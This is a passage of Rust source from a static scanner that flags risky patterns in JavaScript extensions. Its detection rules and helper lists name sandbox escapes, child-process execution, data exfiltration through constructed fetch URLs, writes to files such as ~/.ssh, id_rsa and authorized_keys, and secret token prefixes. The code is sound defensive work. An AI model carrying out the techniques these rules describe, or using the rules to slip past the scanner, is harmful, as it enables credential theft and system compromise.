    SensitivePathWrite,

    // ---- Medium tier ----
    /// `process.env` access for reading environment variables.
    #[serde(rename = "SEC-ENV-001")]
    ProcessEnvAccess,
    /// Timer abuse (very short-interval `setInterval`).
    #[serde(rename = "SEC-TIMER-001")]
    TimerAbuse,
    /// `Proxy` / `Reflect` interception patterns.
    #[serde(rename = "SEC-PROXY-001")]
    ProxyReflect,
    /// `with` statement usage (scope chain manipulation).
    #[serde(rename = "SEC-WITH-001")]
    WithStatement,

    // ---- Low tier ----
    /// `debugger` statement left in source.
    #[serde(rename = "SEC-DEBUG-001")]
    DebuggerStatement,
    /// `console` usage that may leak information.
    #[serde(rename = "SEC-CONSOLE-001")]
    ConsoleInfoLeak,

    // ---- Added in rulebook v2.0.0 ----

    // Critical tier:
    /// Command execution via `child_process.exec/spawn/execFile/fork`.
    #[serde(rename = "SEC-SPAWN-001")]
    ChildProcessSpawn,
    /// Sandbox escape via `constructor.constructor('return this')()`.
    #[serde(rename = "SEC-CONSTRUCTOR-001")]
    ConstructorEscape,
    /// Native addon require via `.node`/`.so`/`.dylib` file extension.
    #[serde(rename = "SEC-NATIVEMOD-001")]
    NativeModuleRequire,

    // High tier:
    /// `globalThis`/`global` property mutation (sandbox escape vector).
    #[serde(rename = "SEC-GLOBAL-001")]
    GlobalMutation,
    /// Symlink/hard-link creation for path traversal.
    #[serde(rename = "SEC-SYMLINK-001")]
    SymlinkCreation,
    /// `fs.chmod`/`fs.chown` permission elevation.
    #[serde(rename = "SEC-CHMOD-001")]
    PermissionChange,
    /// `net.createServer`/`dgram.createSocket` unauthorized listeners.
    #[serde(rename = "SEC-SOCKET-001")]
    SocketListener,
    /// `WebAssembly.instantiate`/`compile` sandbox bypass.
    #[serde(rename = "SEC-WASM-001")]
    WebAssemblyUsage,

    // Medium tier:
    /// `arguments.callee.caller` stack introspection.
    #[serde(rename = "SEC-ARGUMENTS-001")]
    ArgumentsCallerAccess,
    /// Security scan input was missing or unreadable, preventing trustworthy analysis.
    #[serde(rename = "SEC-SCAN-001")]
    ScanInputFailure,
}

impl SecurityRuleId {
    /// Short human-readable name for this rule.
    #[must_use]
    pub const fn name(self) -> &'static str {
        match self {
            Self::EvalUsage => "eval-usage",
            Self::NewFunctionUsage => "new-function-usage",
            Self::ProcessBinding => "process-binding",
            Self::ProcessDlopen => "process-dlopen",
            Self::ProtoPollution => "proto-pollution",
            Self::RequireCacheManip => "require-cache-manipulation",
            Self::HardcodedSecret => "hardcoded-secret",
            Self::DynamicImport => "dynamic-import",
            Self::DefinePropertyAbuse => "define-property-abuse",
            Self::NetworkExfiltration => "network-exfiltration",
            Self::SensitivePathWrite => "sensitive-path-write",
            Self::ProcessEnvAccess => "process-env-access",
            Self::TimerAbuse => "timer-abuse",
            Self::ProxyReflect => "proxy-reflect",
            Self::WithStatement => "with-statement",
            Self::DebuggerStatement => "debugger-statement",
            Self::ConsoleInfoLeak => "console-info-leak",
            Self::ChildProcessSpawn => "child-process-spawn",
            Self::ConstructorEscape => "constructor-escape",
            Self::NativeModuleRequire => "native-module-require",
            Self::GlobalMutation => "global-mutation",
            Self::SymlinkCreation => "symlink-creation",
            Self::PermissionChange => "permission-change",
            Self::SocketListener => "socket-listener",
            Self::WebAssemblyUsage => "webassembly-usage",
            Self::ArgumentsCallerAccess => "arguments-caller-access",
            Self::ScanInputFailure => "scan-input-failure",
        }
    }

    /// Default risk tier for this rule.
    #[must_use]
    pub const fn default_tier(self) -> RiskTier {
        if matches!(
            self,
            Self::EvalUsage
                | Self::NewFunctionUsage
                | Self::ProcessBinding
                | Self::ProcessDlopen
                | Self::ProtoPollution
                | Self::RequireCacheManip
                | Self::ChildProcessSpawn
                | Self::ConstructorEscape
                | Self::NativeModuleRequire
        ) {
            RiskTier::Critical
        } else if matches!(
            self,
            Self::HardcodedSecret
                | Self::DynamicImport
                | Self::DefinePropertyAbuse
                | Self::NetworkExfiltration
                | Self::SensitivePathWrite
                | Self::GlobalMutation
                | Self::SymlinkCreation
                | Self::PermissionChange
                | Self::SocketListener
                | Self::WebAssemblyUsage
        ) {
            RiskTier::High
        } else if matches!(
            self,
            Self::ProcessEnvAccess
                | Self::TimerAbuse
                | Self::ProxyReflect
                | Self::WithStatement
                | Self::ArgumentsCallerAccess
        ) {
            RiskTier::Medium
        } else if matches!(self, Self::ScanInputFailure) {
            RiskTier::High
        } else {
            RiskTier::Low
        }
    }
}

impl fmt::Display for SecurityRuleId {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(self.name())
    }
}

/// Risk tier for security findings.  Ordered from most to least severe so
/// the `Ord` derive gives the correct comparison direction.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum RiskTier {
    /// Immediate block — active exploit vector.
    Critical,
    /// Likely dangerous — should block by default.
    High,
    /// Suspicious — warrants review.
    Medium,
    /// Informational risk — monitor.
    Low,
}

impl fmt::Display for RiskTier {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Critical => f.write_str("critical"),
            Self::High => f.write_str("high"),
            Self::Medium => f.write_str("medium"),
            Self::Low => f.write_str("low"),
        }
    }
}

/// A single security finding from static analysis.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecurityFinding {
    /// Stable rule identifier.
    pub rule_id: SecurityRuleId,
    /// Risk tier (may differ from `rule_id.default_tier()` if context
    /// modifies severity).
    pub risk_tier: RiskTier,
    /// Human-readable rationale for the finding.
    pub rationale: String,
    /// Source file path (relative to extension root).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub file: Option<String>,
    /// 1-based line number.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub line: Option<usize>,
    /// 1-based column number.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub column: Option<usize>,
    /// Matched source snippet (trimmed).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub snippet: Option<String>,
}

/// Aggregate risk classification for an extension.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecurityScanReport {
    /// Schema version.
    pub schema: String,
    /// Extension identifier.
    pub extension_id: String,
    /// Overall risk tier (worst finding).
    pub overall_tier: RiskTier,
    /// Counts per tier.
    pub tier_counts: SecurityTierCounts,
    /// Individual findings sorted by tier (worst first).
    pub findings: Vec<SecurityFinding>,
    /// Human-readable one-line verdict.
    pub verdict: String,
    /// Rulebook version that produced this report.
    pub rulebook_version: String,
}

/// Counts by risk tier.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct SecurityTierCounts {
    pub critical: usize,
    pub high: usize,
    pub medium: usize,
    pub low: usize,
}

/// Current rulebook version. Bump when rules are added or changed.
///
/// v2.1.0: Added SEC-SCAN-001 so missing/unreadable extension paths fail closed.
/// v2.0.0: Added 9 rules (SEC-SPAWN-001, SEC-CONSTRUCTOR-001, SEC-NATIVEMOD-001,
///   SEC-GLOBAL-001, SEC-SYMLINK-001, SEC-CHMOD-001, SEC-SOCKET-001,
///   SEC-WASM-001, SEC-ARGUMENTS-001). Stabilized deterministic sort order.
pub const SECURITY_RULEBOOK_VERSION: &str = "2.1.0";

impl SecurityScanReport {
    /// Build from a list of findings.
    ///
    /// Findings are sorted deterministically: first by risk tier (Critical
    /// first), then by file path, then by line number, then by rule ID name.
    /// This guarantees identical output for identical input regardless of
    /// scan traversal order.
    #[must_use]
    pub fn from_findings(extension_id: String, mut findings: Vec<SecurityFinding>) -> Self {
        // Deterministic sort: tier → file → line → column → rule name.
        findings.sort_by(|a, b| {
            a.risk_tier
                .cmp(&b.risk_tier)
                .then_with(|| {
                    a.file
                        .as_deref()
                        .unwrap_or("")
                        .cmp(b.file.as_deref().unwrap_or(""))
                })
                .then_with(|| a.line.cmp(&b.line))
                .then_with(|| a.column.cmp(&b.column))
                .then_with(|| a.rule_id.name().cmp(b.rule_id.name()))
        });

        let mut counts = SecurityTierCounts::default();
        for f in &findings {
            match f.risk_tier {
                RiskTier::Critical => counts.critical += 1,
                RiskTier::High => counts.high += 1,
                RiskTier::Medium => counts.medium += 1,
                RiskTier::Low => counts.low += 1,
            }
        }

        let overall_tier = findings.first().map_or(RiskTier::Low, |f| f.risk_tier);

        let verdict = match overall_tier {
            RiskTier::Critical => format!(
                "BLOCK: {} critical finding(s) — active exploit vectors detected",
                counts.critical
            ),
            RiskTier::High => format!(
                "REVIEW REQUIRED: {} high-risk finding(s) — likely dangerous patterns",
                counts.high
            ),
            RiskTier::Medium => format!(
                "CAUTION: {} medium-risk finding(s) — warrants review",
                counts.medium
            ),
            RiskTier::Low if findings.is_empty() => "CLEAN: no security findings".to_string(),
            RiskTier::Low => format!("INFO: {} low-risk finding(s) — informational", counts.low),
        };

        Self {
            schema: SECURITY_SCAN_SCHEMA.to_string(),
            extension_id,
            overall_tier,
            tier_counts: counts,
            findings,
            verdict,
            rulebook_version: SECURITY_RULEBOOK_VERSION.to_string(),
        }
    }

    /// Serialize to pretty JSON.
    ///
    /// # Errors
    ///
    /// Returns an error if serialization fails.
    pub fn to_json(&self) -> Result<String, serde_json::Error> {
        serde_json::to_string_pretty(self)
    }

    /// Whether the report recommends blocking the extension.
    #[must_use]
    pub const fn should_block(&self) -> bool {
        matches!(self.overall_tier, RiskTier::Critical)
    }

    /// Whether the report recommends manual review.
    #[must_use]
    pub const fn needs_review(&self) -> bool {
        matches!(self.overall_tier, RiskTier::Critical | RiskTier::High)
    }
}

// ============================================================================
// Evidence ledger for correlation with runtime behavior
// ============================================================================

/// Schema version for the security evidence ledger.
pub const SECURITY_EVIDENCE_LEDGER_SCHEMA: &str = "pi.ext.security_evidence_ledger.v1";

/// A single evidence entry for the security ledger. Designed for JSONL
/// serialization so it can be correlated with runtime hostcall telemetry.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecurityEvidenceLedgerEntry {
    pub schema: String,
    /// Monotonic entry index within this scan.
    pub entry_index: usize,
    /// Extension identifier.
    pub extension_id: String,
    /// Rule ID that fired.
    pub rule_id: SecurityRuleId,
    /// Risk tier.
    pub risk_tier: RiskTier,
    /// Human-readable rationale.
    pub rationale: String,
    /// Source file (relative).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub file: Option<String>,
    /// 1-based line.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub line: Option<usize>,
    /// 1-based column.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub column: Option<usize>,
    /// Rulebook version.
    pub rulebook_version: String,
}

impl SecurityEvidenceLedgerEntry {
    /// Convert a `SecurityFinding` into a ledger entry.
    #[must_use]
    pub fn from_finding(entry_index: usize, extension_id: &str, finding: &SecurityFinding) -> Self {
        Self {
            schema: SECURITY_EVIDENCE_LEDGER_SCHEMA.to_string(),
            entry_index,
            extension_id: extension_id.to_string(),
            rule_id: finding.rule_id,
            risk_tier: finding.risk_tier,
            rationale: finding.rationale.clone(),
            file: finding.file.clone(),
            line: finding.line,
            column: finding.column,
            rulebook_version: SECURITY_RULEBOOK_VERSION.to_string(),
        }
    }
}

/// Produce a JSONL evidence ledger from a security scan report.
///
/// # Errors
///
/// Returns an error if serialization of any entry fails.
pub fn security_evidence_ledger_jsonl(
    report: &SecurityScanReport,
) -> Result<String, serde_json::Error> {
    let mut out = String::new();
    for (i, finding) in report.findings.iter().enumerate() {
        let entry = SecurityEvidenceLedgerEntry::from_finding(i, &report.extension_id, finding);
        if i > 0 {
            out.push('\n');
        }
        out.push_str(&serde_json::to_string(&entry)?);
    }
    Ok(out)
}

// ============================================================================
// Security scanner implementation
// ============================================================================

/// Scans extension source for security-sensitive patterns and produces a
/// deterministic risk classification report.
pub struct SecurityScanner;

impl SecurityScanner {
    const fn scan_input_failure_finding(
        file: Option<String>,
        rationale: String,
    ) -> SecurityFinding {
        SecurityFinding {
            rule_id: SecurityRuleId::ScanInputFailure,
            risk_tier: SecurityRuleId::ScanInputFailure.default_tier(),
            rationale,
            file,
            line: None,
            column: None,
            snippet: None,
        }
    }

    /// Scan raw source text and produce a security scan report.
    #[must_use]
    pub fn scan_source(extension_id: &str, source: &str) -> SecurityScanReport {
        let mut findings = Vec::new();

        for (idx, line) in source.lines().enumerate() {
            let line_no = idx + 1;
            let trimmed = line.trim();

            // Skip empty lines and full-line comments.
            if trimmed.is_empty()
                || trimmed.starts_with("//")
                || trimmed.starts_with('*')
                || trimmed.starts_with("/*")
            {
                continue;
            }

            Self::scan_line(trimmed, line_no, &mut findings);
        }

        SecurityScanReport::from_findings(extension_id.to_string(), findings)
    }

    /// Scan extension files under a directory.
    pub fn scan_path(extension_id: &str, path: &Path, root: &Path) -> SecurityScanReport {
        match validate_extension_scan_input(path) {
            Ok(true) => {}
            Ok(false) => {
                return SecurityScanReport::from_findings(
                    extension_id.to_string(),
                    vec![Self::scan_input_failure_finding(
                        Some(path.display().to_string()),
                        format!(
                            "Extension path does not exist, so the security scan could not inspect any source: {}",
                            path.display()
                        ),
                    )],
                );
            }
            Err(err) => {
                return SecurityScanReport::from_findings(
                    extension_id.to_string(),
                    vec![Self::scan_input_failure_finding(
                        Some(path.display().to_string()),
                        format!(
                            "Failed to access extension source at {}: {err}",
                            path.display()
                        ),
                    )],
                );
            }
        }

        let files = match collect_scannable_files(path) {
            Ok(files) => files,
            Err(err) => {
                return SecurityScanReport::from_findings(
                    extension_id.to_string(),
                    vec![Self::scan_input_failure_finding(
                        Some(path.display().to_string()),
                        format!(
                            "Failed to enumerate extension source at {}: {err}",
                            path.display()
                        ),
                    )],
                );
            }
        };
        let mut findings = Vec::new();

        for file_path in &files {
            let rel = relative_posix_path(root, file_path);
            let content = match std::fs::read_to_string(file_path) {
                Ok(content) => content,
                Err(err) => {
                    findings.push(Self::scan_input_failure_finding(
                        Some(rel),
                        format!(
                            "Failed to read extension source at {}: {err}",
                            file_path.display()
                        ),
                    ));
                    continue;
                }
            };
            let mut in_block_comment = false;

            for (idx, raw_line) in content.lines().enumerate() {
                let line_no = idx + 1;

                // Track block comments.
                let line = strip_block_comment_tracking(raw_line, &mut in_block_comment);
                let trimmed = line.trim();

                if trimmed.is_empty() || trimmed.starts_with("//") || trimmed.starts_with('*') {
                    continue;
                }

                Self::scan_line_with_file(trimmed, line_no, &rel, &mut findings);
            }
        }

        SecurityScanReport::from_findings(extension_id.to_string(), findings)
    }

    fn scan_line(text: &str, line_no: usize, findings: &mut Vec<SecurityFinding>) {
        Self::scan_line_with_file(text, line_no, "", findings);
    }

    #[allow(clippy::too_many_lines)]
    fn scan_line_with_file(
        text: &str,
        line_no: usize,
        file: &str,
        findings: &mut Vec<SecurityFinding>,
    ) {
        let file_opt = if file.is_empty() {
            None
        } else {
            Some(file.to_string())
        };

        // ---- Critical tier ----

        // SEC-EVAL-001: eval() usage (not in string or property name).
        if contains_eval_call(text) {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::EvalUsage,
                risk_tier: RiskTier::Critical,
                rationale: "eval() enables arbitrary code execution at runtime".to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: text.find("eval(").map(|c| c + 1),
                snippet: Some(truncate_snippet(text)),
            });
        }

        // SEC-FUNC-001: new Function(...).
        if text.contains("new Function") && !text.contains("new Function()") {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::NewFunctionUsage,
                risk_tier: RiskTier::Critical,
                rationale: "new Function() creates code from strings, enabling injection"
                    .to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: text.find("new Function").map(|c| c + 1),
                snippet: Some(truncate_snippet(text)),
            });
        }

        // SEC-BIND-001: process.binding().
        if text.contains("process.binding") {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::ProcessBinding,
                risk_tier: RiskTier::Critical,
                rationale: "process.binding() accesses internal Node.js C++ bindings".to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: text.find("process.binding").map(|c| c + 1),
                snippet: Some(truncate_snippet(text)),
            });
        }

        // SEC-DLOPEN-001: process.dlopen().
        if text.contains("process.dlopen") {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::ProcessDlopen,
                risk_tier: RiskTier::Critical,
                rationale: "process.dlopen() loads native addons, bypassing sandbox".to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: text.find("process.dlopen").map(|c| c + 1),
                snippet: Some(truncate_snippet(text)),
            });
        }

        // SEC-PROTO-001: __proto__ assignment.
        if text.contains("__proto__") || text.contains("Object.setPrototypeOf") {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::ProtoPollution,
                risk_tier: RiskTier::Critical,
                rationale: "Prototype manipulation can pollute shared object chains".to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: text
                    .find("__proto__")
                    .or_else(|| text.find("Object.setPrototypeOf"))
                    .map(|c| c + 1),
                snippet: Some(truncate_snippet(text)),
            });
        }

        // SEC-RCACHE-001: require.cache manipulation.
        if text.contains("require.cache") {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::RequireCacheManip,
                risk_tier: RiskTier::Critical,
                rationale: "require.cache manipulation can hijack module resolution".to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: text.find("require.cache").map(|c| c + 1),
                snippet: Some(truncate_snippet(text)),
            });
        }

        // ---- High tier ----

        // SEC-SECRET-001: hardcoded secrets.
        if contains_hardcoded_secret(text) {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::HardcodedSecret,
                risk_tier: RiskTier::High,
                rationale: "Potential hardcoded secret or API key detected".to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: None,
                snippet: Some(truncate_snippet(text)),
            });
        }

        // SEC-DIMPORT-001: dynamic import().
        if contains_dynamic_import(text) {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::DynamicImport,
                risk_tier: RiskTier::High,
                rationale: "Dynamic import() can load arbitrary modules at runtime".to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: text.find("import(").map(|c| c + 1),
                snippet: Some(truncate_snippet(text)),
            });
        }

        // SEC-DEFPROP-001: Object.defineProperty on global/prototype.
        if text.contains("Object.defineProperty")
            && (text.contains("globalThis")
                || text.contains("global.")
                || text.contains("prototype"))
        {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::DefinePropertyAbuse,
                risk_tier: RiskTier::High,
                rationale: "Object.defineProperty on global/prototype can intercept operations"
                    .to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: text.find("Object.defineProperty").map(|c| c + 1),
                snippet: Some(truncate_snippet(text)),
            });
        }

        // SEC-EXFIL-001: Network exfiltration patterns.
        if contains_exfiltration_pattern(text) {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::NetworkExfiltration,
                risk_tier: RiskTier::High,
                rationale: "Potential data exfiltration via constructed network request"
                    .to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: None,
                snippet: Some(truncate_snippet(text)),
            });
        }

        // SEC-FSSENS-001: Writes to sensitive paths.
        if contains_sensitive_path_write(text) {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::SensitivePathWrite,
                risk_tier: RiskTier::High,
                rationale: "Write to security-sensitive filesystem path detected".to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: None,
                snippet: Some(truncate_snippet(text)),
            });
        }

        // ---- Medium tier ----

        // SEC-ENV-001: process.env access.
        if text.contains("process.env") {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::ProcessEnvAccess,
                risk_tier: RiskTier::Medium,
                rationale: "process.env access may expose secrets or configuration".to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: text.find("process.env").map(|c| c + 1),
                snippet: Some(truncate_snippet(text)),
            });
        }

        // SEC-TIMER-001: Timer abuse (very short intervals).
        if contains_timer_abuse(text) {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::TimerAbuse,
                risk_tier: RiskTier::Medium,
                rationale: "Very short timer interval may indicate resource abuse".to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: None,
                snippet: Some(truncate_snippet(text)),
            });
        }

        // SEC-PROXY-001: Proxy/Reflect usage.
        if text.contains("new Proxy") || text.contains("Reflect.") {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::ProxyReflect,
                risk_tier: RiskTier::Medium,
                rationale: "Proxy/Reflect can intercept and modify object operations transparently"
                    .to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: text
                    .find("new Proxy")
                    .or_else(|| text.find("Reflect."))
                    .map(|c| c + 1),
                snippet: Some(truncate_snippet(text)),
            });
        }

        // SEC-WITH-001: with statement.
        if contains_with_statement(text) {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::WithStatement,
                risk_tier: RiskTier::Medium,
                rationale:
                    "with statement modifies scope chain, making variable resolution unpredictable"
                        .to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: text.find("with").map(|c| c + 1),
                snippet: Some(truncate_snippet(text)),
            });
        }

        // ---- Low tier ----

        // SEC-DEBUG-001: debugger statement.
        if text.contains("debugger") && is_debugger_statement(text) {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::DebuggerStatement,
                risk_tier: RiskTier::Low,
                rationale: "debugger statement left in production code".to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: text.find("debugger").map(|c| c + 1),
                snippet: Some(truncate_snippet(text)),
            });
        }

        // SEC-CONSOLE-001: console.error/warn with interpolated values.
        if contains_console_info_leak(text) {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::ConsoleInfoLeak,
                risk_tier: RiskTier::Low,
                rationale: "Console output may leak sensitive information".to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: text.find("console.").map(|c| c + 1),
                snippet: Some(truncate_snippet(text)),
            });
        }

        // ==== Rules added in rulebook v2.0.0 ====

        // ---- Critical tier (v2) ----

        // SEC-SPAWN-001: child_process command execution.
        if contains_child_process_spawn(text) {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::ChildProcessSpawn,
                risk_tier: RiskTier::Critical,
                rationale: "child_process command execution enables arbitrary system commands"
                    .to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: find_child_process_column(text),
                snippet: Some(truncate_snippet(text)),
            });
        }

        // SEC-CONSTRUCTOR-001: constructor.constructor sandbox escape.
        if text.contains("constructor.constructor") || text.contains("constructor[\"constructor\"]")
        {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::ConstructorEscape,
                risk_tier: RiskTier::Critical,
                rationale:
                    "constructor.constructor() can escape sandbox by accessing Function constructor"
                        .to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: text
                    .find("constructor.constructor")
                    .or_else(|| text.find("constructor[\"constructor\"]"))
                    .map(|c| c + 1),
                snippet: Some(truncate_snippet(text)),
            });
        }

        // SEC-NATIVEMOD-001: native module require (.node/.so/.dylib).
        if contains_native_module_require(text) {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::NativeModuleRequire,
                risk_tier: RiskTier::Critical,
                rationale: "Requiring native addon (.node/.so/.dylib) bypasses JS sandbox"
                    .to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: text.find("require(").map(|c| c + 1),
                snippet: Some(truncate_snippet(text)),
            });
        }

        // ---- High tier (v2) ----

        // SEC-GLOBAL-001: globalThis/global property mutation.
        if contains_global_mutation(text) {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::GlobalMutation,
                risk_tier: RiskTier::High,
                rationale: "Mutating globalThis/global properties can escape sandbox scope"
                    .to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: text
                    .find("globalThis.")
                    .or_else(|| text.find("global."))
                    .or_else(|| text.find("globalThis["))
                    .map(|c| c + 1),
                snippet: Some(truncate_snippet(text)),
            });
        }

        // SEC-SYMLINK-001: symlink/link creation.
        if contains_symlink_creation(text) {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::SymlinkCreation,
                risk_tier: RiskTier::High,
                rationale: "Symlink/link creation can enable path traversal attacks".to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: text
                    .find("symlink")
                    .or_else(|| text.find("link"))
                    .map(|c| c + 1),
                snippet: Some(truncate_snippet(text)),
            });
        }

        // SEC-CHMOD-001: permission changes.
        if contains_permission_change(text) {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::PermissionChange,
                risk_tier: RiskTier::High,
                rationale: "Changing file permissions can enable privilege escalation".to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: text
                    .find("chmod")
                    .or_else(|| text.find("chown"))
                    .map(|c| c + 1),
                snippet: Some(truncate_snippet(text)),
            });
        }

        // SEC-SOCKET-001: network listener creation.
        if contains_socket_listener(text) {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::SocketListener,
                risk_tier: RiskTier::High,
                rationale: "Creating network listeners opens unauthorized server ports".to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: text
                    .find("createServer")
                    .or_else(|| text.find("createSocket"))
                    .map(|c| c + 1),
                snippet: Some(truncate_snippet(text)),
            });
        }

        // SEC-WASM-001: WebAssembly usage.
        if text.contains("WebAssembly.") {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::WebAssemblyUsage,
                risk_tier: RiskTier::High,
                rationale: "WebAssembly can execute native code, bypassing JS sandbox controls"
                    .to_string(),
                file: file_opt.clone(),
                line: Some(line_no),
                column: text.find("WebAssembly.").map(|c| c + 1),
                snippet: Some(truncate_snippet(text)),
            });
        }

        // ---- Medium tier (v2) ----

        // SEC-ARGUMENTS-001: arguments.callee.caller introspection.
        if text.contains("arguments.callee") || text.contains("arguments.caller") {
            findings.push(SecurityFinding {
                rule_id: SecurityRuleId::ArgumentsCallerAccess,
                risk_tier: RiskTier::Medium,
                rationale:
                    "arguments.callee/caller enables stack introspection and caller chain walking"
                        .to_string(),
                file: file_opt,
                line: Some(line_no),
                column: text
                    .find("arguments.callee")
                    .or_else(|| text.find("arguments.caller"))
                    .map(|c| c + 1),
                snippet: Some(truncate_snippet(text)),
            });
        }
    }
}

// ============================================================================
// Pattern detection helpers
// ============================================================================

const fn is_js_ident_continue(byte: u8) -> bool {
    byte.is_ascii_alphanumeric() || matches!(byte, b'_' | b'$')
}

/// Check for `eval(...)` that isn't in a property name or string context.
fn contains_eval_call(text: &str) -> bool {
    let mut search = text;
    while let Some(pos) = search.find("eval(") {
        // Not preceded by a dot (method call on object) or letter (part of
        // another identifier like `retrieval`).
        if pos == 0
            || (!is_js_ident_continue(search.as_bytes()[pos - 1])
                && search.as_bytes()[pos - 1] != b'.')
        {
            return true;
        }
        search = &search[pos + 5..];
    }
    false
}

/// Check for dynamic `import(...)` — not static `import ... from`.
fn contains_dynamic_import(text: &str) -> bool {
    let trimmed = text.trim();
    // Static import statements start with `import` at the beginning.
    if trimmed.starts_with("import ") || trimmed.starts_with("import{") {
        return false;
    }
    text.contains("import(")
}

/// Detect hardcoded secret patterns: API keys, tokens, passwords.
fn contains_hardcoded_secret(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    // Look for assignment patterns with secret-like names.
    let secret_keywords = [
        "api_key",
        "apikey",
        "api-key",
        "secret_key",
        "secretkey",
        "secret-key",
        "password",
        "passwd",
        "access_token",
        "accesstoken",
        "private_key",
        "privatekey",
        "auth_token",
        "authtoken",
    ];

    for kw in &secret_keywords {
        if let Some(kw_pos) = lower.find(kw) {
            // Check if followed by assignment with a string literal.
            let rest = &text[kw_pos + kw.len()..];
            let rest_trimmed = rest.trim_start();
            if (rest_trimmed.starts_with("=\"")
                || rest_trimmed.starts_with("= \"")
                || rest_trimmed.starts_with("='")
                || rest_trimmed.starts_with("= '")
                || rest_trimmed.starts_with(": \"")
                || rest_trimmed.starts_with(":\"")
                || rest_trimmed.starts_with(": '")
                || rest_trimmed.starts_with(":'"))
                // Ignore env lookups: process.env.API_KEY
                && !lower[..kw_pos].ends_with("process.env.")
                && !lower[..kw_pos].ends_with("env.")
                // Ignore empty strings.
                && !rest_trimmed.starts_with("=\"\"")
                && !rest_trimmed.starts_with("= \"\"")
                && !rest_trimmed.starts_with("=''")
                && !rest_trimmed.starts_with("= ''")
            {
                return true;
            }
        }
    }

    // Also detect common token prefixes (sk-ant-, ghp_, etc.) assigned as literals.
    let token_prefixes = ["sk-ant-", "sk-", "ghp_", "gho_", "glpat-", "xoxb-", "xoxp-"];
    for pfx in &token_prefixes {
        if text.contains(&format!("\"{pfx}")) || text.contains(&format!("'{pfx}")) {
            return true;
        }
    }

    false
}

/// Detect network exfiltration: fetch/XMLHttpRequest with template literals
/// or concatenated URLs (not simple static URLs).
fn contains_exfiltration_pattern(text: &str) -> bool {
    let has_network_call = text.contains("fetch(") || text.contains("XMLHttpRequest");
    if !has_network_call {
        return false;
    }
    // Suspicious if URL is constructed from variables (template literal or concat).
    text.contains("fetch(`") || text.contains("fetch(\"http\" +") || text.contains("fetch(url")
}

/// Detect writes to sensitive filesystem paths.
fn contains_sensitive_path_write(text: &str) -> bool {
    let has_write = text.contains("writeFileSync")
        || text.contains("writeFile(")
        || text.contains("fs.write")
        || text.contains("appendFileSync")
        || text.contains("appendFile(");
    if !has_write {
        return false;
    }
    let sensitive_paths = [
        "/etc/",
        "/root/",
        "~/.ssh",
        "~/.bashrc",
        "~/.profile",
        "~/.zshrc",
        "/usr/",
        "/var/",
        ".env",
        "id_rsa",
        "authorized_keys",
    ];
    sensitive_paths.iter().any(|p| text.contains(p))
}

/// Detect very short timer intervals (< 10ms).
fn contains_timer_abuse(text: &str) -> bool {
    if !text.contains("setInterval") {
        return false;
    }
    // Look for setInterval(..., N) where N < 10.
    if let Some(pos) = text.rfind(", ") {
        let rest = text[pos + 2..]
            .trim_end_matches(';')
